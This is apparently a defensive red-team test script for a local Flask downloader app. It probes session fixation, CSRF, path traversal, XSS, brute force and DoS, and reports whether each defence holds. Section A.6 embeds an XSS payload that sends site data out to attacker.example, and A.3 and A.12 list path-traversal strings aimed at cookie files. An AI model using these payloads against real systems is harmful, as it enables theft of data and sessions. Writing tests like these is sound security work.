"""Adversarial probe — red-team attack scenarios.

Each section frames a complete attack story. Where security_probe asks
"is defense X in place", adversarial_probe asks "can I, the attacker,
achieve goal Y by chaining requests".

The threat model is a LAN-resident attacker who can reach the app on
127.0.0.1:9876 from another device on the same network. They cannot
log into the operator's machine, install software, or read files
directly — they only have HTTP.

Sections:
  A.1   Session-pinning attack — fix a victim's session before login
  A.2   CSRF-via-error-page — coerce browser to issue stateful GET
  A.3   Cookie file leak via path traversal in retrieval endpoints
  A.4   Exfiltrate site config via aggressive enumeration
  A.5   Disable dev mode kill-switch via env manipulation (negative test)
  A.6   Stored XSS chain via FTS snippet (verifies Bug 9 fix from attacker view)
  A.7   Auth-bearer brute force — does rate limiting fire?
  A.8   Resource exhaustion — fill log dir, fill history, fill queue
  A.9   Race: rapid create-delete to hit window where save races with read
  A.10  Pivot to internal: SSRF via configurable login_url (server fetch?)
  A.11  Long-poll DoS — many slow-reader clients
  A.12  Cookie file read via screenshot or diagnostic endpoint

Run via:
  BD_DISABLE_KEEPALIVE=1 python tools/adversarial_probe.py
"""
from __future__ import annotations
import json
import os
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _probe_lib as L  # noqa: E402

opts = L.parse_flags()
FAST = opts["fast"]

rep = L.Report("ADV")
client, bd_app, bd_db, BD_HOME = L.make_isolated_client(prefix="bd_adv_")

# Bootstrap legitimate operator session
client.get("/")
csrf = client.get("/api/csrf")
TOK = (csrf.get_json() or {}).get("csrf_token", "") if csrf.status_code == 200 else ""
HDRS = {"X-CSRF-Token": TOK} if TOK else {}

# ─── A.1: Session pinning ──────────────────────────────────────────────
rep.section("A.1 — Session pinning attempt")
# Attacker tries to set a session cookie before the operator does, then
# wait for operator to load page; if operator inherits the attacker's
# session id, attacker can hijack.
attacker = bd_app.app.test_client()
ATTACKER_FIXED = "ATTACKER_FIXED_SESSION_ID_12345"
# Werkzeug 2.x: set_cookie(key, value, domain=...) — 3-arg signature
try:
    attacker.set_cookie("bd_session", ATTACKER_FIXED, domain="localhost")
except TypeError:
    # Older Werkzeug: set_cookie(server_name, key, value)
    try:
        attacker.set_cookie("localhost", "bd_session", ATTACKER_FIXED)
    except Exception:
        pass

r = attacker.get("/")
victim_sess = ""
# Read whatever ended up in the response Set-Cookie
set_cookie = r.headers.get("Set-Cookie", "")
if "bd_session=" in set_cookie:
    victim_sess = set_cookie.split("bd_session=")[1].split(";")[0]
# Also check the cookie jar
if not victim_sess:
    try:
        # Werkzeug 2.x cookie jar
        for c in attacker._cookies.values():
            if c.key == "bd_session":
                victim_sess = c.value
                break
    except Exception:
        pass

if victim_sess == ATTACKER_FIXED:
    rep.F("crit", "session pinning: server ACCEPTED attacker-supplied session id")
elif victim_sess:
    # Never emit the minted value. ATTACKER_FIXED is our own synthetic input so
    # it is safe to name, but victim_sess is a REAL server-minted bd_session --
    # the CSRF-bound auth session. The probe's finding is that the two DIFFER,
    # and that is a boolean; the value adds nothing a reader needs and this
    # report is shipped.
    rep.F("ok", f"session pinning blocked: server minted fresh id",
          f"attacker_id={ATTACKER_FIXED[:30]!r} "
          f"server_id=<omitted, len={len(victim_sess)}, differs from attacker_id>")
else:
    rep.F("info", "no bd_session cookie in response — can't probe pinning")

# ─── A.2: CSRF via error page ──────────────────────────────────────────
rep.section("A.2 — CSRF via error page (state change on GET)")
# Verify no GET handler performs a state-changing action (mutation must
# require POST/PUT/PATCH/DELETE so CSRF gates it).
state_before = dict(bd_app.s_cfg)
client.get("/api/sites?name=ghost_create&sneaky=true")
client.get("/api/sites/nonexistent/delete")
client.get("/api/global_config?global_max_concurrent=99&via=get")
state_after = dict(bd_app.s_cfg)
if state_before == state_after:
    rep.F("ok", "GET requests did not mutate state")
else:
    diff = set(state_after) - set(state_before)
    rep.F("crit", f"GET-induced state change: {len(diff)} new sites",
          "CSRF defense bypassed via GET method")

# ─── A.3: Cookie file via path traversal ───────────────────────────────
rep.section("A.3 — Cookie file exfiltration via path traversal")
# 1) Save a site with cookie_file = some real path
real_cf = os.path.join(BD_HOME, "real_cookies.json")
with open(real_cf, "w") as f:
    json.dump([{"name": "session", "value": "SECRET_TOKEN_DO_NOT_LEAK"}], f)
client.post("/api/sites",
            json={"name": "leak_test", "cookie_file": real_cf},
            headers=HDRS)

# 2) Try a number of endpoints that might serve files, with traversals
LEAK_TRIES = [
    "/screenshots/../real_cookies.json",
    "/screenshots/../../" + os.path.basename(real_cf),
    "/screenshots_evil_prefix/../real_cookies.json",
    "/video/../real_cookies.json",
    "/static/../real_cookies.json",
    "/static/../../real_cookies.json",
]
leaks = 0
for path in LEAK_TRIES:
    r = client.get(path)
    if r.status_code == 200 and b"SECRET_TOKEN_DO_NOT_LEAK" in r.data:
        rep.F("crit", f"COOKIE LEAK via {path}")
        leaks += 1
if leaks == 0:
    rep.F("ok", f"{len(LEAK_TRIES)} traversal exfil attempts blocked")

# ─── A.4: Aggressive site enumeration ──────────────────────────────────
rep.section("A.4 — Site/secret enumeration")
# An attacker wanting to enumerate sites can use /api/sites_list (low
# detail, by design — id/name/hostname only). Verify it doesn't leak
# cookie_file paths, download_dir, login URLs with passwords, API keys.
r = client.get("/api/sites_list")
body_str = r.data.decode("utf-8", errors="replace")
LEAK_INDICATORS = ["cookie", "password", "api_key", "secret",
                   "download_dir", "/etc/", "SECRET_TOKEN"]
leaked = [k for k in LEAK_INDICATORS if k.lower() in body_str.lower()]
# "cookie" might appear if a site name happens to include it — be lenient
real_leaks = [k for k in leaked if k != "cookie"]
if real_leaks:
    rep.F("crit", f"/api/sites_list leaks: {real_leaks}",
          f"body[0:300]={body_str[:300]!r}")
else:
    rep.F("ok", "/api/sites_list does not leak secrets")

# ─── A.5: Kill-switch bypass (negative test) ───────────────────────────
rep.section("A.5 — Dev mode kill-switch cannot be unset via API")
# Set the kill-switch, verify /api/dev/enabled returns false. Then try
# every API trick to flip it back on (impossible — env var is process-level,
# not API-controllable).
os.environ["BD_DEV_MODE_DISABLE"] = "1"
r = client.get("/api/dev/enabled")
if r.status_code == 200 and (r.get_json() or {}).get("enabled") is False:
    rep.F("ok", "kill-switch is active")
else:
    rep.F("bug", "kill-switch did not disable dev mode")

# Try to clear it via /api/global_config (should be ignored / 4xx)
r = client.post("/api/global_config",
                json={"BD_DEV_MODE_DISABLE": ""},
                headers=HDRS)
# Whether or not the POST succeeded, dev mode should still be disabled
r2 = client.get("/api/dev/enabled")
if (r2.get_json() or {}).get("enabled") is False:
    rep.F("ok", "API cannot override BD_DEV_MODE_DISABLE env var")
else:
    rep.F("crit", "API REVERSED the kill-switch — env-derived state mutable")
del os.environ["BD_DEV_MODE_DISABLE"]

# ─── A.6: Stored XSS via FTS snippet (Bug 9 retest) ────────────────────
rep.section("A.6 — Stored XSS via FTS snippet (attacker POV)")
# Plant a "scraped URL" / filename containing literal <script>
PAYLOAD = "<script>fetch('/api/sites_list').then(r=>r.text()).then(d=>fetch('//attacker.example/?d='+encodeURIComponent(d)))</script>"
try:
    with bd_db.db_conn() as cx:
        cx.execute(
            "INSERT INTO history (url, site_id, site_name, filename, status) "
            "VALUES (?, ?, ?, ?, ?)",
            (f"https://example.com/{PAYLOAD}", "xss_sid", "xss_site",
             f"{PAYLOAD}.mp4", "ok"))
        try:
            cx.execute("INSERT INTO history_fts(history_fts) VALUES('rebuild')")
        except Exception:
            pass
        cx.commit()

    results = bd_db.db_search_fts("script")
    found_script_tag = False
    for r in results:
        for k in ("snippet_url", "snippet_filename", "snippet_message"):
            v = r.get(k) or ""
            # Look for <script> literally (escape would be &lt;script&gt;)
            if "<script>" in v:
                found_script_tag = True
                break
    if found_script_tag:
        rep.F("crit", "<script> appears UNESCAPED in FTS snippet — Bug 9 regression")
    else:
        rep.F("ok", "FTS snippet escapes <script>, <mark> highlights preserved")
except Exception as ex:
    rep.F("warn", f"XSS chain probe errored: {ex}")

# ─── A.7: Bearer brute force ───────────────────────────────────────────
rep.section("A.7 — Bearer brute force / rate limit")
# In default config, BD_AUTH_TOKEN is unset → auth is open (single-user
# LAN model). To actually test brute force we must SET a token first,
# then verify wrong guesses are rejected. Restore prior state at end.
prev_token = os.environ.get("BD_AUTH_TOKEN")
SECRET_TOKEN = "real_token_abc123xyz_NOT_GUESSABLE_BY_ATTACKER"
os.environ["BD_AUTH_TOKEN"] = SECRET_TOKEN
# The app reads BD_AUTH_TOKEN via _expected_token() at request time, so
# no restart is needed.

# Fresh client without session cookie / referer — only the bearer header
# can authorise the request.
brute_client = bd_app.app.test_client()
N = 30 if FAST else 100
t0 = time.perf_counter()
codes: dict[int, int] = {}
for i in range(N):
    r = brute_client.post("/api/sites",
                          json={"name": "brute_force"},
                          headers={"Authorization": f"Bearer guess_{i:08d}"})
    codes[r.status_code] = codes.get(r.status_code, 0) + 1
elapsed = time.perf_counter() - t0

# Verify the GOOD token still works — proves the probe machinery is
# exercising the right code path
r = brute_client.post("/api/sites",
                      json={"name": "real_auth"},
                      headers={"Authorization": f"Bearer {SECRET_TOKEN}"})
good_works = (r.status_code == 200)

# Restore prior token state
if prev_token is None:
    del os.environ["BD_AUTH_TOKEN"]
else:
    os.environ["BD_AUTH_TOKEN"] = prev_token

if codes.get(200, 0) > 0:
    rep.F("crit", f"BRUTE FORCE SUCCESS: {codes[200]} guesses returned 200",
          f"wrong bearer accepted while BD_AUTH_TOKEN={SECRET_TOKEN[:8]}...")
elif not good_works:
    rep.F("info", f"probe couldn't verify auth wall (good token also rejected) "
          f"— codes={codes}")
elif codes.get(401, 0) >= N * 0.9:
    rep.F("ok", f"{N} wrong-bearer guesses all rejected ({codes.get(401,0)} × 401) "
          f"in {elapsed:.1f}s — auth wall holds")
else:
    rep.F("ok", f"{N} brute-force guesses all rejected (codes={codes})")

# ─── A.8: Resource exhaustion ──────────────────────────────────────────
rep.section("A.8 — Resource exhaustion (history / log / queue)")
# Massive insert into history — verify it survives without crashing the app
N_ROWS = 1000 if FAST else 10000
t0 = time.perf_counter()
try:
    with bd_db.db_conn() as cx:
        for i in range(N_ROWS):
            cx.execute(
                "INSERT INTO history (url, site_id, site_name, filename, status) "
                "VALUES (?, ?, ?, ?, ?)",
                (f"https://example.com/bulk_{i}.mp4",
                 "exhaust_sid", "exhaust",
                 f"bulk_{i}.mp4", "ok"))
        cx.commit()
    elapsed = time.perf_counter() - t0
    rep.F("ok", f"inserted {N_ROWS} rows in {elapsed:.2f}s — DB survived")

    # Now hit /api/history — should it page properly?
    r = client.get("/api/history?limit=100")
    if r.status_code == 200:
        rep.F("ok", f"history GET still responds after bulk insert: HTTP 200")
    else:
        rep.F("warn", f"history GET degraded: HTTP {r.status_code}")

    # FTS search across the bulk — should be sub-second
    t0 = time.perf_counter()
    results = bd_db.db_search_fts("bulk")
    fts_elapsed = time.perf_counter() - t0
    if fts_elapsed < 2.0:
        rep.F("ok", f"FTS search across {N_ROWS} rows in {fts_elapsed*1000:.0f}ms "
              f"({len(results)} hits)")
    else:
        rep.F("warn", f"FTS slow on {N_ROWS} rows: {fts_elapsed*1000:.0f}ms")
except Exception as ex:
    rep.F("bug", f"resource exhaustion threw: {ex}")

# ─── A.9: Create-delete race ───────────────────────────────────────────
rep.section("A.9 — Create-delete race")
# 4 threads alternating create + delete — does the persisted JSON ever
# end up corrupt? Validate by reloading sites_config.json afterward.
race_errors: list[str] = []
sites_path = os.path.join(BD_HOME, "sites_config.json")

def race_worker(idx: int):
    try:
        for i in range(20 if FAST else 50):
            r = client.post("/api/sites",
                            json={"name": f"race_{idx}_{i}"},
                            headers=HDRS)
            sid = None
            for k, s in bd_app.s_cfg.items():
                if s.get("name") == f"race_{idx}_{i}":
                    sid = k
                    break
            if sid:
                client.delete(f"/api/sites/{sid}", headers=HDRS)
    except Exception as ex:
        race_errors.append(f"thread {idx}: {ex}")

threads = [threading.Thread(target=race_worker, args=(i,), daemon=True)
           for i in range(4)]
for t in threads: t.start()
for t in threads: t.join(timeout=60)

if race_errors:
    rep.F("bug", f"{len(race_errors)} race errors",
          race_errors[0])
else:
    rep.F("ok", "concurrent create+delete threads finished")

# Validate persisted JSON is still parseable
if os.path.exists(sites_path):
    try:
        with open(sites_path) as f:
            json.load(f)
        rep.F("ok", "sites_config.json still parseable after race")
    except json.JSONDecodeError as ex:
        rep.F("crit", f"sites_config.json CORRUPT after race: {ex}")

# ─── A.10: SSRF via login_url ──────────────────────────────────────────
rep.section("A.10 — SSRF via configurable URLs (static check)")
# Verify the app doesn't fetch login_url server-side on save. (It's the
# browser's job during a login session — server should never hit it.)
import re as _re
try:
    src = open(os.path.join(L.REPO_ROOT, "bulk_downloader", "app.py")).read()
    # Heuristic: look for `requests.get(login_url` or `urlopen(login_url`
    risky = _re.findall(r"(requests\.|urlopen|httpx\.|fetch\().*login_url", src)
    if risky:
        rep.F("warn", f"{len(risky)} possible server-side fetch of login_url",
              "review each for SSRF surface")
    else:
        rep.F("ok", "login_url not server-fetched at save time")
except Exception as ex:
    rep.F("info", f"SSRF static check failed: {ex}")

# ─── A.11: Long-poll / slow reader DoS ─────────────────────────────────
rep.section("A.11 — Slow-reader DoS")
# Flask test_client doesn't model true slow-readers; we settle for a
# capacity test: many connections holding state.
# Verify many concurrent CSRF-bootstrap GET / requests don't blow up memory.
many_clients = []
try:
    for _ in range(200 if FAST else 1000):
        c = bd_app.app.test_client()
        c.get("/")
        many_clients.append(c)
    rep.F("ok", f"{len(many_clients)} concurrent sessions bootstrapped")
except Exception as ex:
    rep.F("bug", f"session bootstrap failed at {len(many_clients)} clients: {ex}")
many_clients = []  # release

# ─── A.12: Cookie leak via screenshot ──────────────────────────────────
rep.section("A.12 — Cookie file leak via screenshot endpoint")
# Plant a cookie file in BD_HOME/cookies/, try serve_ss with crafted
# traversals to reach it.
cookies_dir = os.path.join(BD_HOME, "cookies")
os.makedirs(cookies_dir, exist_ok=True)
with open(os.path.join(cookies_dir, "test.json"), "w") as f:
    f.write('{"session":"COOKIE_DO_NOT_LEAK"}')

LEAK_PATHS = [
    "/screenshots/../cookies/test.json",
    "/screenshots/..%2fcookies%2ftest.json",
    "/screenshots/cookies/test.json",
    "/cookies/test.json",
    "/screenshots/%2e%2e/cookies/test.json",
]
leaks = 0
for path in LEAK_PATHS:
    r = client.get(path)
    if r.status_code == 200 and b"COOKIE_DO_NOT_LEAK" in r.data:
        rep.F("crit", f"COOKIE LEAK via {path}")
        leaks += 1
if leaks == 0:
    rep.F("ok", f"{len(LEAK_PATHS)} cookie-leak attempts blocked")

# ─── Summary ───────────────────────────────────────────────────────────
rep.summary()
sys.exit(rep.exit_code())
